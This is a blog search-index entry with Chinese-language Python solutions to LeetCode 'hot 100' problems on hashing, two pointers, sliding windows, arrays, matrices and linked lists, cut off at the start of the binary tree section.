<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>力扣hot100python题解</title>
    <url>/2025/03/04/%E5%8A%9B%E6%89%A3hot100python%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h1>哈希</h1>
<ul>
<li>两数之和</li>
</ul>
<p>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。</p>
<p>你可以按任意顺序返回答案。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> index, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            <span class="keyword">if</span> (target-num) <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [index, hashtable[target-num]]</span><br><span class="line">            hashtable[num] = index</span><br></pre></td></tr></table></figure>
<ul>
<li>字母异位词分组</li>
</ul>
<p>给你一个字符串数组，请你将 <strong>字母异位词</strong> 组合在一起。可以按任意顺序返回结果列表。</p>
<p><strong>字母异位词</strong> 是由重新排列源单词的所有字母得到的一个新单词。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">groupAnagrams</span>(<span class="params">self, strs: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        ans = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> strs:</span><br><span class="line">            key = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(s))</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> ans:</span><br><span class="line">                ans[key] = [s]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ans[key].append(s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(ans.values()) </span><br></pre></td></tr></table></figure>
<ul>
<li>最长连续序列</li>
</ul>
<p>给定一个未排序的整数数组 <code>nums</code> ，找出数字连续的最长序列（不要求序列元素在原数组中连续）的长度。</p>
<p>请你设计并实现时间复杂度为 <code>O(n)</code> 的算法解决此问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def longestConsecutive(self, nums: List[int]) -&gt; int:</span><br><span class="line">        ans = 0 </span><br><span class="line">        st = set(nums)</span><br><span class="line">        for x in st:</span><br><span class="line">            if x-1 in st:</span><br><span class="line">                continue</span><br><span class="line">            y = x+1 </span><br><span class="line">            while y in st:</span><br><span class="line">                y = y + 1</span><br><span class="line">            ans = max(ans,y -x)</span><br><span class="line">        return ans  </span><br></pre></td></tr></table></figure>
<h1>双指针</h1>
<ul>
<li>移动0</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def moveZeroes(self, nums: List[int]) -&gt; None:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Do not return anything, modify nums in-place instead.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        left = right = 0</span><br><span class="line">        while right &lt; len(nums):</span><br><span class="line">            if nums[right]!=0:</span><br><span class="line">                nums[left],nums[right]=nums[right],nums[left]</span><br><span class="line">                left += 1 </span><br><span class="line">            right += 1</span><br></pre></td></tr></table></figure>
<ul>
<li>盛水最多容器</li>
</ul>
<p>给定一个长度为 <code>n</code> 的整数数组 <code>height</code> 。有 <code>n</code> 条垂线，第 <code>i</code> 条线的两个端点是 <code>(i, 0)</code> 和 <code>(i, height[i])</code> 。</p>
<p>找出其中的两条线，使得它们与 <code>x</code> 轴共同构成的容器可以容纳最多的水。</p>
<p>返回容器可以储存的最大水量。</p>
<p>**说明：**你不能倾斜容器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxArea(self, height: List[int]) -&gt; int:</span><br><span class="line">        left = ans = 0</span><br><span class="line">        right = len(height) - 1</span><br><span class="line">        while left &lt; right :</span><br><span class="line">            if height[left] &lt; height[right]:</span><br><span class="line">                ans = max(ans,height[left]*(right-left))</span><br><span class="line">                left += 1</span><br><span class="line">            else:</span><br><span class="line">                ans = max(ans,height[right]*(right-left))</span><br><span class="line">                right -= 1</span><br><span class="line">        return ans</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<ul>
<li>三数之和</li>
</ul>
<p>给你一个整数数组 <code>nums</code> ，判断是否存在三元组 <code>[nums[i], nums[j], nums[k]]</code> 满足 <code>i != j</code>、<code>i != k</code> 且 <code>j != k</code> ，同时还满足 <code>nums[i] + nums[j] + nums[k] == 0</code> 。请你返回所有和为 <code>0</code> 且不重复的三元组。</p>
<p>**注意：**答案中不可以包含重复的三元组。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        ans = []</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">2</span>):</span><br><span class="line">            x = nums[i]</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> x == nums[i - <span class="number">1</span>]:  <span class="comment"># 跳过重复数字</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> x + nums[i + <span class="number">1</span>] + nums[i + <span class="number">2</span>] &gt; <span class="number">0</span>:  <span class="comment"># 优化一</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> x + nums[-<span class="number">2</span>] + nums[-<span class="number">1</span>] &lt; <span class="number">0</span>:  <span class="comment"># 优化二</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            j = i + <span class="number">1</span></span><br><span class="line">            k = n - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt; k:</span><br><span class="line">                s = x + nums[j] + nums[k]</span><br><span class="line">                <span class="keyword">if</span> s &gt; <span class="number">0</span>:</span><br><span class="line">                    k -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> s &lt; <span class="number">0</span>:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:  <span class="comment"># 三数之和为 0</span></span><br><span class="line">                    ans.append([x, nums[j], nums[k]])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> j &lt; k <span class="keyword">and</span> nums[j] == nums[j - <span class="number">1</span>]:  <span class="comment"># 跳过重复数字</span></span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                    k -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> k &gt; j <span class="keyword">and</span> nums[k] == nums[k + <span class="number">1</span>]:  <span class="comment"># 跳过重复数字</span></span><br><span class="line">                        k -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>接雨水</p>
<p>给定 <code>n</code> 个非负整数表示每个宽度为 <code>1</code> 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">trap</span>(<span class="params">self, height: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> height:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        left, right = <span class="number">0</span>, <span class="built_in">len</span>(height) - <span class="number">1</span>  <span class="comment"># 两个指针</span></span><br><span class="line">        left_max, right_max = height[left], height[right]  <span class="comment"># 左右最大边界</span></span><br><span class="line">        ans = <span class="number">0</span>  <span class="comment"># 结果累加器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            <span class="keyword">if</span> height[left] &lt; height[right]:</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> height[left] &gt; left_max:</span><br><span class="line">                    left_max = height[left]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ans += left_max - height[left]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> height[right] &gt; right_max:</span><br><span class="line">                    right_max = height[right]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ans += right_max - height[right]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
<h1>滑动窗口</h1>
</li>
<li>
<p>无重复字符的最长字串</p>
<p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长 子串</strong> 的长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        start = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> index, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">                res = <span class="built_in">max</span>(res, index-start)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> d[c] &gt; start:</span><br><span class="line">                    start = d[c] </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = <span class="built_in">max</span>(res, index-start)</span><br><span class="line">            d[c] = index</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>找到字符串中所有字母异位词</p>
<p>给定两个字符串 <code>s</code> 和 <code>p</code>，找到 <code>s</code> 中所有 <code>p</code> 的 <strong>异位词</strong> 的子串，返回这些子串的起始索引。不考虑答案输出的顺序。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: s = &quot;cbaebabacd&quot;, p = &quot;abc&quot;</span><br><span class="line">输出: [0,6]</span><br><span class="line">解释:</span><br><span class="line">起始索引等于 0 的子串是 &quot;cba&quot;, 它是 &quot;abc&quot; 的异位词。</span><br><span class="line">起始索引等于 6 的子串是 &quot;bac&quot;, 它是 &quot;abc&quot; 的异位词。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def findAnagrams(self, s: str, p: str) -&gt; List[int]:</span><br><span class="line">        # 获取字符串 s 和 p 的长度</span><br><span class="line">        s_len, p_len = len(s), len(p)</span><br><span class="line">        </span><br><span class="line">        # 如果 s 的长度小于 p 的长度，直接返回空列表，因为无法形成异位词子串</span><br><span class="line">        if s_len &lt; p_len:</span><br><span class="line">            return []</span><br><span class="line"></span><br><span class="line">        # 初始化结果列表，用于存储异位词子串的起始索引</span><br><span class="line">        ans = []</span><br><span class="line"></span><br><span class="line">        # 初始化两个长度为 26 的数组，用于统计字符频率</span><br><span class="line">        # s_count 用于统计当前窗口内的字符频率</span><br><span class="line">        # p_count 用于统计字符串 p 的字符频率</span><br><span class="line">        s_count = [0] * 26</span><br><span class="line">        p_count = [0] * 26</span><br><span class="line"></span><br><span class="line">        # 遍历 p 的前 p_len 个字符，初始化 s_count 和 p_count</span><br><span class="line">        for i in range(p_len):</span><br><span class="line">            # 统计 s 的前 p_len 个字符的频率</span><br><span class="line">            s_count[ord(s[i]) - 97] += 1</span><br><span class="line">            # 统计 p 的前 p_len 个字符的频率</span><br><span class="line">            p_count[ord(p[i]) - 97] += 1</span><br><span class="line"></span><br><span class="line">        # 如果初始窗口的字符频率与 p 的字符频率相等，说明第一个窗口就是异位词</span><br><span class="line">        # 将起始索引 0 加入结果列表</span><br><span class="line">        if s_count == p_count:</span><br><span class="line">            ans.append(0)</span><br><span class="line"></span><br><span class="line">        # 滑动窗口遍历 s 的剩余部分</span><br><span class="line">        for i in range(s_len - p_len):</span><br><span class="line">            # 窗口滑动时，移除窗口左侧的字符，将其频率减 1</span><br><span class="line">            s_count[ord(s[i]) - 97] -= 1</span><br><span class="line">            # 添加窗口右侧的新字符，将其频率加 1</span><br><span class="line">            s_count[ord(s[i + p_len]) - 97] += 1</span><br><span class="line">            </span><br><span class="line">            # 检查当前窗口的字符频率是否与 p 的字符频率相等</span><br><span class="line">            # 如果相等，说明当前窗口是异位词，将起始索引（i + 1）加入结果列表</span><br><span class="line">            if s_count == p_count:</span><br><span class="line">                ans.append(i + 1)</span><br><span class="line"></span><br><span class="line">        # 返回结果列表</span><br><span class="line">        return ans</span><br></pre></td></tr></table></figure>
<h1>子串</h1>
<ul>
<li>
<p>和为 k的子数组</p>
<p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你统计并返回 <em>该数组中和为 <code>k</code> 的子数组的个数</em> 。</p>
<p>子数组是数组中元素的连续非空序列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subarraySum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">         count, pre = <span class="number">0</span>, <span class="number">0</span> </span><br><span class="line">         hashmap = <span class="built_in">dict</span>(&#123;<span class="number">0</span>:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            pre += num</span><br><span class="line">            <span class="keyword">if</span> pre - k <span class="keyword">in</span> hashmap:</span><br><span class="line">                count += hashmap[pre - k]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> pre <span class="keyword">in</span> hashmap:</span><br><span class="line">                hashmap[pre] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hashmap[pre] = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">         <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>滑动窗口最大值</p>
</li>
</ul>
<p>给你一个整数数组 <code>nums</code>，有一个大小为 <code>k</code> 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 <code>k</code> 个数字。滑动窗口每次只向右移动一位。</p>
<p>返回 <em>滑动窗口中的最大值</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxSlidingWindow</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 如果数组为空或窗口大小为0，直接返回空列表</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums <span class="keyword">or</span> k == <span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用双端队列来存储当前窗口中的元素索引</span></span><br><span class="line">        deque = collections.deque()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 未形成窗口时的处理</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            <span class="comment"># 如果队列不为空且队列末尾的元素小于当前元素，则弹出队列末尾的元素</span></span><br><span class="line">            <span class="comment"># 这样可以保证队列中的元素是递减的</span></span><br><span class="line">            <span class="keyword">while</span> deque <span class="keyword">and</span> deque[-<span class="number">1</span>] &lt; nums[i]:</span><br><span class="line">                deque.pop()</span><br><span class="line">            <span class="comment"># 将当前元素加入队列</span></span><br><span class="line">            deque.append(nums[i])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将当前窗口的最大值（即队列的第一个元素）加入结果列表</span></span><br><span class="line">        res = [deque[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 形成窗口后的处理</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k, <span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="comment"># 如果队列的第一个元素是窗口最左边的元素，则将其从队列中移除</span></span><br><span class="line">            <span class="comment"># 因为这个元素即将离开窗口</span></span><br><span class="line">            <span class="keyword">if</span> deque[<span class="number">0</span>] == nums[i - k]:</span><br><span class="line">                deque.popleft()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果队列不为空且队列末尾的元素小于当前元素，则弹出队列末尾的元素</span></span><br><span class="line">            <span class="comment"># 这样可以保证队列中的元素是递减的</span></span><br><span class="line">            <span class="keyword">while</span> deque <span class="keyword">and</span> deque[-<span class="number">1</span>] &lt; nums[i]:</span><br><span class="line">                deque.pop()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 将当前元素加入队列</span></span><br><span class="line">            deque.append(nums[i])</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 将当前窗口的最大值（即队列的第一个元素）加入结果列表</span></span><br><span class="line">            res.append(deque[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回结果列表</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<ul>
<li>最小覆盖字串</li>
</ul>
<p>给你一个字符串 <code>s</code> 、一个字符串 <code>t</code> 。返回 <code>s</code> 中涵盖 <code>t</code> 所有字符的最小子串。如果 <code>s</code> 中不存在涵盖 <code>t</code> 所有字符的子串，则返回空字符串 <code>&quot;&quot;</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def minWindow(self, s: str, t: str) -&gt; str:</span><br><span class="line">        ans_left, ans_right = -1, len(s)</span><br><span class="line">        cnt = defaultdict(int)  # 比 Counter 更快</span><br><span class="line">        for c in t:</span><br><span class="line">            cnt[c] += 1</span><br><span class="line">        less = len(cnt)</span><br><span class="line"></span><br><span class="line">        left = 0</span><br><span class="line">        for right, c in enumerate(s):</span><br><span class="line">            cnt[c] -= 1</span><br><span class="line">            if cnt[c] == 0:</span><br><span class="line">                less -= 1</span><br><span class="line">            while less == 0:</span><br><span class="line">                if right - left &lt; ans_right - ans_left:</span><br><span class="line">                    ans_left, ans_right = left, right</span><br><span class="line">                x = s[left]</span><br><span class="line">                if cnt[x] == 0:</span><br><span class="line">                    less += 1</span><br><span class="line">                cnt[x] += 1</span><br><span class="line">                left += 1</span><br><span class="line"></span><br><span class="line">        return &quot;&quot; if ans_left &lt; 0 else s[ans_left: ans_right + 1]</span><br></pre></td></tr></table></figure>
<h1>普通数组</h1>
<ul>
<li>最大子数组和</li>
</ul>
<p>给你一个整数数组 <code>nums</code> ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>
<p><strong>子数组</strong>是数组中的一个连续部分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxSubArray(self, nums: List[int]) -&gt; int:</span><br><span class="line">        count = 0</span><br><span class="line">        result = -99999</span><br><span class="line">        for i in nums:</span><br><span class="line">            count += i</span><br><span class="line">            if count &gt; result:</span><br><span class="line">                result = count</span><br><span class="line">            if count &lt; 0:</span><br><span class="line">                count = 0</span><br><span class="line">        </span><br><span class="line">        return result</span><br></pre></td></tr></table></figure>
<ul>
<li>合并区间</li>
</ul>
<p>以数组 <code>intervals</code> 表示若干个区间的集合，其中单个区间为 <code>intervals[i] = [starti, endi]</code> 。请你合并所有重叠的区间，并返回 <em>一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间</em> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def merge(self, intervals: List[List[int]]) -&gt; List[List[int]]:</span><br><span class="line">        intervals.sort(key=lambda x: x[0])</span><br><span class="line"></span><br><span class="line">        merged = []</span><br><span class="line">        for interval in intervals:</span><br><span class="line">            # 如果列表为空，或者当前区间与上一区间不重合，直接添加</span><br><span class="line">            if not merged or merged[-1][1] &lt; interval[0]:</span><br><span class="line">                merged.append(interval)</span><br><span class="line">            else:</span><br><span class="line">                # 否则的话，我们就可以与上一区间进行合并</span><br><span class="line">                merged[-1][1] = max(merged[-1][1], interval[1])</span><br><span class="line"></span><br><span class="line">        return merged</span><br></pre></td></tr></table></figure>
<ul>
<li>轮转数组</li>
</ul>
<p>给定一个整数数组 <code>nums</code>，将数组中的元素向右轮转 <code>k</code> 个位置，其中 <code>k</code> 是非负数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def rotate(self, nums: List[int], k: int) -&gt; None:</span><br><span class="line">        def reverse(i: int, j: int) -&gt; None:</span><br><span class="line">            while i &lt; j:</span><br><span class="line">                nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                i += 1</span><br><span class="line">                j -= 1</span><br><span class="line"></span><br><span class="line">        n = len(nums)</span><br><span class="line">        k %= n  # 轮转 k 次等于轮转 k % n 次</span><br><span class="line">        reverse(0, n - 1)</span><br><span class="line">        reverse(0, k - 1)</span><br><span class="line">        reverse(k, n - 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>除自身以外数组的乘积</li>
</ul>
<p>给你一个整数数组 <code>nums</code>，返回 数组 <code>answer</code> ，其中 <code>answer[i]</code> 等于 <code>nums</code> 中除 <code>nums[i]</code> 之外其余各元素的乘积 。</p>
<p>题目数据 <strong>保证</strong> 数组 <code>nums</code>之中任意元素的全部前缀元素和后缀的乘积都在 <strong>32 位</strong> 整数范围内。</p>
<p>请 **不要使用除法，**且在 <code>O(n)</code> 时间复杂度内完成此题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">class Solution:</span><br><span class="line">    def productExceptSelf(self, nums: List[int]) -&gt; List[int]:</span><br><span class="line">        # 如果有0，可以简化运算</span><br><span class="line">        total = math.prod(nums)</span><br><span class="line">        ans = []</span><br><span class="line">        for i, num in enumerate(nums):</span><br><span class="line">            if num != 0:</span><br><span class="line">                ans.append(total // num)</span><br><span class="line">            else:</span><br><span class="line">                ans.append(math.prod(nums[:i] + nums[i+1:]))</span><br><span class="line">        return ans</span><br></pre></td></tr></table></figure>
<ul>
<li>缺失的第一个正数</li>
</ul>
<p>给你一个未排序的整数数组 <code>nums</code> ，请你找出其中没有出现的最小的正整数。</p>
<p>请你实现时间复杂度为 <code>O(n)</code> 并且只使用常数级别额外空间的解决方案。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def firstMissingPositive(self, nums: List[int]) -&gt; int:</span><br><span class="line">        N = len(nums)</span><br><span class="line">        num_list = [0]*(N+1)</span><br><span class="line">        for num in nums:</span><br><span class="line">            if num&gt;N or num&lt;=0:</span><br><span class="line">                continue</span><br><span class="line">            num_list[num] = 1</span><br><span class="line">        </span><br><span class="line">        for i in range(1,N+1):</span><br><span class="line">            if num_list[i] == 0:</span><br><span class="line">                return i</span><br><span class="line">        return N+1</span><br></pre></td></tr></table></figure>
<h1>矩阵</h1>
<ul>
<li>矩阵置零</li>
</ul>
<p>给定一个 <code>*m* x *n*</code> 的矩阵，如果一个元素为 <strong>0</strong> ，则将其所在行和列的所有元素都设为 <strong>0</strong> 。请使用 <strong><a href="http://baike.baidu.com/item/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95">原地</a></strong> 算法**。**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def setZeroes(self, matrix: List[List[int]]) -&gt; None:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Do not return anything, modify matrix in-place instead.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        m, n = len(matrix), len(matrix[0])</span><br><span class="line">        row = [False] * m</span><br><span class="line">        col = [False] * n</span><br><span class="line"></span><br><span class="line">        for i in range(m):</span><br><span class="line">            for j in range(n):</span><br><span class="line">                if matrix[i][j] == 0:</span><br><span class="line">                    row[i], col[j] = True, True</span><br><span class="line"></span><br><span class="line">        for i in range(m):</span><br><span class="line">            for j in range(n):</span><br><span class="line">                if row[i] or col[j]:</span><br><span class="line">                    matrix[i][j] = 0</span><br></pre></td></tr></table></figure>
<ul>
<li>螺旋矩阵</li>
</ul>
<p>给你一个 <code>m</code> 行 <code>n</code> 列的矩阵 <code>matrix</code> ，请按照 <strong>顺时针螺旋顺序</strong> ，返回矩阵中的所有元素。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def spiralOrder(self, matrix: List[List[int]]) -&gt; List[int]:</span><br><span class="line">        result = []</span><br><span class="line">        while matrix :</span><br><span class="line">            result.extend(matrix.pop(0))</span><br><span class="line">            if matrix :</span><br><span class="line">                if matrix[0]:</span><br><span class="line">                    for i in range(len(matrix)):</span><br><span class="line">                        result.append(matrix[i].pop())</span><br><span class="line">            if matrix :</span><br><span class="line">                k = matrix.pop()</span><br><span class="line">                result.extend(k[::-1])</span><br><span class="line">            if matrix  :</span><br><span class="line">                if matrix[0]:</span><br><span class="line">                    for i in range(len(matrix)-1,-1,-1):</span><br><span class="line">                        result.append(matrix[i].pop(0))</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure>
<ul>
<li>旋转图像</li>
</ul>
<p>给定一个 <em>n</em> × <em>n</em> 的二维矩阵 <code>matrix</code> 表示一个图像。请你将图像顺时针旋转 90 度。</p>
<p>你必须在**<a href="https://baike.baidu.com/item/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95"> 原地</a>** 旋转图像，这意味着你需要直接修改输入的二维矩阵。<strong>请不要</strong> 使用另一个矩阵来旋转图像。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def rotate(self, matrix: List[List[int]]) -&gt; None:</span><br><span class="line">        n = len(matrix)</span><br><span class="line">        # 深拷贝 matrix -&gt; tmp</span><br><span class="line">        tmp = copy.deepcopy(matrix)</span><br><span class="line">        # 根据元素旋转公式，遍历修改原矩阵 matrix 的各元素</span><br><span class="line">        for i in range(n):</span><br><span class="line">            for j in range(n):</span><br><span class="line">                matrix[j][n - 1 - i] = tmp[i][j]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>链表</h1>
<ul>
<li>相交链表</li>
</ul>
<p>给你两个单链表的头节点 <code>headA</code> 和 <code>headB</code> ，请你找出并返回两个单链表相交的起始节点。如果两个链表不存在相交节点，返回 <code>null</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&gt; ListNode:</span><br><span class="line">        A, B = headA, headB</span><br><span class="line">        while A != B:</span><br><span class="line">            A = A.next if A else headB</span><br><span class="line">            B = B.next if B else headA</span><br><span class="line">        return A</span><br></pre></td></tr></table></figure>
<ul>
<li>反转链表</li>
</ul>
<p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Definition for singly-linked list.</span><br><span class="line"># class ListNode:</span><br><span class="line">#     def __init__(self, val=0, next=None):</span><br><span class="line">#         self.val = val</span><br><span class="line">#         self.next = next</span><br><span class="line">class Solution:</span><br><span class="line">    def reverseList(self, head: Optional[ListNode]) -&gt; Optional[ListNode]:</span><br><span class="line">        cur ,pre = head, None</span><br><span class="line">        while cur:</span><br><span class="line">            temp = cur.next</span><br><span class="line">            cur.next = pre</span><br><span class="line">            pre = cur</span><br><span class="line">            cur = temp</span><br><span class="line">        return pre</span><br></pre></td></tr></table></figure>
<h1>二叉树</h1>
<ul>
<li>二叉树的中序遍历</li>
</ul>
<p>给定一个二叉树的根节点 <code>root</code> ，返回 <em>它的 <strong>中序</strong> 遍历</em></p>
